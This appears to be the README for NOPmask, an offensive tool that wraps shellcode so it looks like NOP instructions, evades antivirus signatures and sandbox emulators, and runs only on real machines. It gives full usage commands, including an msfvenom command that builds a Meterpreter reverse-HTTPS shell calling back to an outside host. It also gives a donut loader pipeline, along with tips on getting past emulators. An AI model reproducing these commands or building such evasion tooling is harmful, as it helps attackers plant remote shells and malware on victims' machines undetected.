# NOPmask v1.0
██████████████████████████████████████████████
█▄─▀█▄─▄█─▄▄─█▄─▄▄─█▄─▀█▀─▄██▀▄─██─▄▄▄▄█▄─█─▄█
██─█▄▀─██─██─██─▄▄▄██─█▄█─███─▀─██▄▄▄▄─██─▄▀██
▀▄▄▄▀▀▄▄▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀

Shellcode obfuscation utility to evade signature-based detection and emulator-driven analysis.

---

## Features

- Encrypts shellcode to appear like benign NOP instructions.
- Only decrypts and executes shellcode if running on real machine.
- Uses pure assembly with no dependencies, so it works on any operating system.

---

## Installation

Clone the repository:

```bash
git clone https://github.com/whoamiamleo/NOPmask
cd NOPmask
```

Install dependencies:
```bash
pip install -r requirements.txt
```

---

## Usage
```console
usage: NOPmask.py [-h] -a {amd64,i386} -i INPUT -o OUTPUT -f {base64,binary}

options:
  -h, --help                        show this help message and exit
  -a, --arch {amd64,i386}           target CPU architecture
  -i, --input INPUT                 path to input file
  -o, --output OUTPUT               path to output file
  -f, --format {base64,binary}      format of output file
```

Basic usage example:
```bash
python NOPmask.py -a amd64 -i shellcode.bin -o masked_shellcode.bin -f binary
```

Example of using with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw -o raw_shellcode.bin
python NOPmask.py -a amd64 -i raw_shellcode.bin -o masked_shellcode.bin -f binary
msfvenom -p generic/custom PAYLOADFILE=masked_shellcode.bin -f C -v shellcode
```

Example of using with donut:
```bash
donut.exe -a 2 -i payload.dll -o loader.bin
python NOPmask.py -a amd64 -i loader.bin -o masked_loader.bin -f binary
msfvenom -p generic/custom PAYLOADFILE=masked_loader.bin -f C -v shellcode
```

### Warnings

1. The decryption stub alters the memory space that the shellcode is executed within, and therefore the memory space allocated for the shellcode must have Read/Write/Execution permissions.
2. The emulation evasion technique employed here exploits the fact that emulators are not patient, they will try to rush the emulation to not let the user wait, so please allow up to a minute for your shellcode to execute.

---

## Attribution

Written by Leopold von Niebelschuetz-Godlewski

[https://github.com/whoamiamleo/NOPmask](https://github.com/whoamiamleo/NOPmask)

Licensed under the MIT License.

If you use NOPmask in your projects, a link back or mention is appreciated!

---

## Contributing
Contributions, issues, and feature requests are welcome!
Feel free to check the [issues](https://github.com/whoamiamleo/NOPmask/issues) page or submit a pull request.

---

## License
This project is licensed under the MIT License — see the [LICENSE](https://raw.githubusercontent.com/whoamiamleo/NOPmask/main/LICENSE) file for details.